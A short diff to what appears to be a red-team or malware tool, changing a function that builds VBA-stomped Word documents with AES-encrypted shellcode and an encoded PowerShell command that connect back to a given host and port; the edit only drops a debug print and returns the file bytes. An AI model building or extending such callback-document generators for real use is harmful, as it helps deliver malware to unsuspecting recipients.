@@ -1171,7 +1171,6 @@ def generate_word_pingback_aes(lhost, lport, proxy, id, stomp_version, template_
         # payloads[64] = raw_bytes_x64
         payloads[64] = openssl_pbkdf2_encrypt(raw_bytes_x64, password)
 
-    print(f"{payloads=}")
     payloads['ps'] = encoded_powershell_command
     payloads['password'] = password
 
@@ -1204,6 +1203,7 @@ def generate_word_pingback_aes(lhost, lport, proxy, id, stomp_version, template_
         with open(stomp_doc(output_path, stomp_version), 'rb') as f:
             retval = f.read()
 
+    return BytesIO(retval)
 
 
 @win.route('/word_form/get', methods=['POST'])
